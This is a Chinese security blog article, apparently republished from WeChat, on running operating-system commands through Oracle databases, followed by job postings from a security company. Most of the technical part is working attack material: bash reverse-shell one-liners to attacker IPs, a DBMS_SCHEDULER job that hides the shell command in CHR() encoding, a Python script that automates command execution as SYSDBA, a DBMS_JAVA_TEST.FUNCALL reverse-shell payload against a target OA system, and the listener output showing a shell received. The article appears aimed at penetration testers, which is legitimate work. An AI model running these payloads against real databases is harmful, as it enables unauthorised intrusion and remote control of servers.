> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/eWbMu-iX-NLT-CB2UITsNg)

**STATEMENT**

**声明**

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

_👇点击阅读第一、二章内容_

[**Oracle 渗透利用（一）**](http://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652492016&idx=1&sn=65dda868965a025bb78c2f4e6bb3ec9e&chksm=f2587343c52ffa55f3162b9aca445a2b7441b587d7b4157a1abdc976368c0bb63a92fb7ed84c&scene=21#wechat_redirect)

[**Oracle 渗透利用（二）**](http://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652492148&idx=1&sn=49c2ecc215b7c8b34f41c6006c6e9ae2&chksm=f25872c7c52ffbd124be3487bf664633de406057082643f18f9555a526556695c8ad527a398c&scene=21#wechat_redirect)

前两章主要介绍了 Oracle 的体系结构、Oracle Java 支持、Oracle CLR 和 Oracle SQL 注入技巧，这一章主要介绍 Oracle 命令执行技巧。

**Oracle 命令执行技巧**

基于不同的权限，常见有三种方案可以执行命令：

DBMS_SCHEDULER、JAVA、Oracle debug

**DBMS_SCHEDULER**

该软件包的使用方式与 Windows 任务计划相似，能够指定某个任务在某时某刻执行，并且可以设置重复方式。经过实践，调用 Java 进行命令执行的优势是支持的版本能够达到 Oracle i8+，而 DBMS_SCHEDULER 软件包是从 Oracle 11g 开始支持。DBMS_SCHEDULER 软件包提供了可以从任何 PL/SQL 程序调用的调度功能和过程的集合。

 **执行频次 -  repeat_interval**

FREQ 用于指定频次计量单位：

（YEARLY, MONTHLY, WEEKLY, DAILY, HOURLY, MINUTELY, and SECONDLY），

1./bin/bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/1122 <&1'

2./bin/bash -i &>/dev/tcp/172.17.0.1/1122 <&1

```
exec DBMS_SCHEDULER.CREATE_JOB(
  job_name=>'J1230', # 任务ID
  job_type=>'EXECUTABLE', 
  number_of_arguments=>2, # 参数数量
  job_action =>'/bin/bash', # 执行路径
  auto_drop=>FALSE
);
# 第一个参数
exec DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('J1230',1,'-c'); 
# 第二个参数
exec DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE(
'J1230',
2, 
CHR(101) || CHR(120) || CHR(101) || CHR(99) || CHR(32) || CHR(98) || CHR(97) || CHR(115) || CHR(104) || CHR(32) || CHR(45) || CHR(105) || CHR(32) || CHR(38) || CHR(62) || CHR(47) || CHR(100) || CHR(101) || CHR(118) || CHR(47) || CHR(116) || CHR(99) || CHR(112) || CHR(47) || CHR(49) || CHR(55) || CHR(50) || CHR(46) || CHR(49) || CHR(55) || CHR(46) || CHR(48) || CHR(46) || CHR(49) || CHR(47) || CHR(49) || CHR(49) || CHR(50) || CHR(50) || CHR(32) || CHR(60) || CHR(38) || CHR(49));

exec DBMS_SCHEDULER.ENABLE('J1230'); # 开始执行

exec DBMS_SCHEDULER.DROP_JOB(job_name=>'J1230') # 删除任务
```

这里采用的是第一种方式，一共只需要传递 2 个参数即可，由于 &1 被 Oracle 进行了特殊处理，因此可以直接调用 CHR 函数进行编码。

```
import cx_Oracle
import time

def connect_oracle(username, password, sid, hostname, port=1521):
    dsn = cx_Oracle.makedsn(hostname, port, service_name=sid)
    connection = cx_Oracle.connect(username, password, dsn, cx_Oracle.SYSDBA,encoding="UTF-8")
    return connection


def query_row_oracle(sql, connection):
    cur = connection.cursor()
    results = cur.execute(sql)
    for row in results:
        print(row[0])


def execute_sql_oracle(sql, connection):
    cur = connection.cursor()
    results = cur.execute(sql)
    connection.commit()

def convert_command_to_oracleString(command):
    command_list = list(command)
    command_oracleString = ''
    for k in range(0,len(command_list)):
        command_oracleString += 'CHR(' + str(ord(command_list[k])) + ')'
        if(k + 1 != len(command_list)):
            command_oracleString += "||"
    # print(command_oracleString)
    return command_oracleString

def dbms_scheduler_execute(command , connection):
    job_name = 'JOracle1'
    bash_command = convert_command_to_oracleString(command)
    create_job_command = "begin \nDBMS_SCHEDULER.CREATE_JOB(job_name=>'%s',job_type=>'EXECUTABLE', number_of_arguments=>2,job_action =>'/bin/bash',auto_drop=>FALSE); \nend;"%(job_name)
    set_job_args_command = "begin \n DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('%s',1,'-c'); \nend;"% (job_name)
    bash_for_job_command = "begin \n  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('%s',2,%s); \nend;" % (job_name, bash_command)
    enable_job_command = "begin \n  DBMS_SCHEDULER.ENABLE('%s'); \nend;" % job_name
    drop_job_command = "begin \n DBMS_SCHEDULER.DROP_JOB(job_name=>'%s');\nend;" %(job_name)
    execute_sql_oracle(drop_job_command, connection)
    """
    print(create_job_command)
    print(set_job_args_command)
    print(bash_for_job_command)
    print(enable_job_command)
    print(drop_job_command)
    """
    execute_sql_oracle(create_job_command, connection)
    execute_sql_oracle(set_job_args_command, connection)
    execute_sql_oracle(bash_for_job_command, connection)
    execute_sql_oracle(enable_job_command, connection)
    time.sleep(3)
    
   # execute_sql_oracle(drop_job_command, connection)


if __name__ == "__main__":
    connection = connect_oracle('sys','sys','helowin','127.0.0.1')
    dbms_scheduler_execute('touch /tmp/222.txt',connection)
    connection.close()
```

使用图形化工具

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWdkMHMUJN0yC6I3DeARFibI7CK7KgFz5iamsz4j7d1oSzKv1dich6z9t40gkSbic38icnh5Xogz7MdTIg/640?wx_fmt=png)

**直连数据库情况下**

**安装 sqlplus**

官方下载地址: 

https://www.oracle.com/database/technologies/instant-client/winx64-64-downloads.html

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWdkMHMUJN0yC6I3DeARFibIMGRl5ucEM46PCwFXXCgMO6VD0Cta0eSzE15JGS87zny6bIe3TJ8nOw/640?wx_fmt=png)

**命令行**

```
root@kali:~# apt install oracle-instantclient12.1-sqlplus -y
```

使用 sqlplus 连接目标 OA 系统的 oracle 数据库，写入 bash 反弹命令。

```
root@kali:~# sqlplus ecology/ecology@192.168.31.75:1521/orcl
SQL> select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','exec 9<> /dev/tcp/172.22.49.131/8080;exec 0<&9;exec 1>&9 2>&1;/bin/sh') from dual;
Enter value for 9: &9
Enter value for 9: &9
Enter value for 1: &1
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWdkMHMUJN0yC6I3DeARFibIrqKrfvyXZqCddQicmpm9d0toJibvnjU13APSGWcygbRDjjy8vUbQZ4mg/640?wx_fmt=png)

nc 监听后，成功收到 shell。

**起初是不能执行系统命令的，需要添加环境变量才可以执行命令，这里需要特殊注意下。**

```
root@kali:~# nc -lvvp 8080
listening on [any] 8080 ...
192.168.31.75: inverse host lookup failed: Unknown host
connect to [172.22.49.131] from (UNKNOWN) [192.168.31.75] 19050

ifconfig
/bin/sh: line 4: ifconfig: No such file or directory 

echo 1
export PATH="/usr/local/bin:/usr/local/sbin:/usr/bin:/bin:/usr/sbin:/sbin" //添加环境变量
ifconfig
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWdkMHMUJN0yC6I3DeARFibIic51qbq41wZZDdEGoj0GU1icibAVLsGLiblDoyCbxCd5kEMhZjial4FFLPA/640?wx_fmt=png)

**JAVA**

使用 sqlps 或者 java 的 jdbc 去链接数据库的话可以进行利用，使用 navicat 等数据库工具进行链接不能进行利用。

**Oracle debug** 

Oracle 命令执行分为两种情况，直连数据库且权限足够的情况是比较容易的，如果是 SQL 注入场景下，大部分是基于存储过程注入（漏洞）来执行命令。

  

本章主要介绍了 Oracle 命令执行技巧，下一章我们将介绍 Oracle 历史漏洞。

👇点击阅读前面内容  

[**Oracle 渗透利用（一）**](http://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652492016&idx=1&sn=65dda868965a025bb78c2f4e6bb3ec9e&chksm=f2587343c52ffa55f3162b9aca445a2b7441b587d7b4157a1abdc976368c0bb63a92fb7ed84c&scene=21#wechat_redirect)

[**Oracle 渗透利用（二）**](http://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652492148&idx=1&sn=49c2ecc215b7c8b34f41c6006c6e9ae2&chksm=f25872c7c52ffbd124be3487bf664633de406057082643f18f9555a526556695c8ad527a398c&scene=21#wechat_redirect)

**RECRUITMENT**

**招聘启事**

**安恒雷神众测 SRC 运营（实习生）**  
————————  
【职责描述】  
1.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

**设计师（实习生）**  

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；

3、精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
4、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至 

bountyteam@dbappsecurity.com.cn

安全招聘  

————————  
公司：安恒信息  
岗位：**Web 安全 安全研究员**  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1. 定期面向部门、全公司技术分享;  
2. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3. 负责完成部门渗透测试、红蓝对抗业务;  
4. 负责自动化平台建设  
5. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1. 至少 1 年安全领域工作经验；  
2. 熟悉 HTTP 协议相关技术  
3. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1. 具备良好的英语文档阅读能力；  
2. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5. 开发过安全相关的开源项目；  
6. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7. 个人技术博客；  
8. 在优质社区投稿过文章；

岗位：**安全红队武器自动化工程师**  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。

简历投递至

bountyteam@dbappsecurity.com.cn

岗位：**红队武器化 Golang 开发工程师**  

薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 掌握 C/C++/Java/Go/Python/JavaScript 等至少一门语言作为主要开发语言；  
2. 熟练使用 Gin、Beego、Echo 等常用 web 开发框架、熟悉 MySQL、Redis、MongoDB 等主流数据库结构的设计, 有独立部署调优经验；  
3. 了解 docker，能进行简单的项目部署；  
3. 熟悉常见 web 漏洞原理，并能写出对应的利用工具；  
4. 熟悉 TCP/IP 协议的基本运作原理；  
5. 对安全技术与开发技术有浓厚的兴趣及热情，有主观研究和学习的动力，具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式、消息队列等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。  
简历投递至

bountyteam@dbappsecurity.com.cn

END

![图片](https://mmbiz.qpic.cn/mmbiz_gif/CtGxzWjGs5uX46SOybVAyYzY0p5icTsasu9JSeiaic9ambRjmGVWuvxFbhbhPCQ34sRDicJwibicBqDzJQx8GIM3AQXQ/640?wx_fmt=gif)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JX1av2ACppVAI0QeqjSPTdCPpJXkaYMAlxSH7KZtiblmPBzy8TjXL6vRyAZRNJgVBwTUrkryxAJUaw/640?wx_fmt=jpeg)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/0BNKhibhMh8eiasiaBAEsmWfxYRZOZdgDBevusQUZzjTCG5QB8B4wgy8TSMiapKsHymVU4PnYYPrSgtQLwArW5QMUA/640?wx_fmt=gif)

**长按识别二维码关注我们**